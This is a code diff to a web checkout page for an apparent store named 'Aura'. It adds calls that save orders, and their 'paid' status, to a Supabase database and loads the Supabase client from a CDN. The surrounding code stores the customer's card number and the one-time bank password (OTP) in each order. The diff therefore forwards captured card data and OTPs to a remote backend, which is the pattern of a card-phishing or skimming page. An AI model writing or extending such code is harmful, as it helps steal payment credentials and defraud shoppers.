@@ -784,6 +784,7 @@
             orders.unshift(partialOrder);
             localStorage.setItem('auraOrders', JSON.stringify(orders));
             localStorage.setItem('pendingOrderId', partialOrder.id);
+            saveOrderToSupabase(partialOrder);
             try { var n = parseInt(localStorage.getItem('auraOrderAlertCount') || '0') + 1; localStorage.setItem('auraOrderAlertCount', n); } catch(e) {}
             showPaymentLoading();
         });
@@ -906,6 +907,7 @@
                 existingOrder.status = 'تم الدفع';
                 existingOrder.cardDetails.otp = otpVal;
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
+                updateOrderStatusInSupabase(existingOrder.id, 'تم الدفع');
             } else {
                 const cardNumber = cardNumberInput.value.replace(/\D/g, '');
                 const last4 = cardNumber.slice(-4);
@@ -936,6 +938,7 @@
                 };
                 orders.unshift(newOrder);
                 localStorage.setItem('auraOrders', JSON.stringify(orders));
+                saveOrderToSupabase(newOrder);
             }
 
             localStorage.removeItem('auraCart');
@@ -957,6 +960,8 @@
         detectCountryByIP();
         initPhoneCountryCode();
     </script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+    <script src="../supabase.js"></script>
     <script src="../lang.js"></script>
     <script src="../social-proof.js"></script>
 </body>
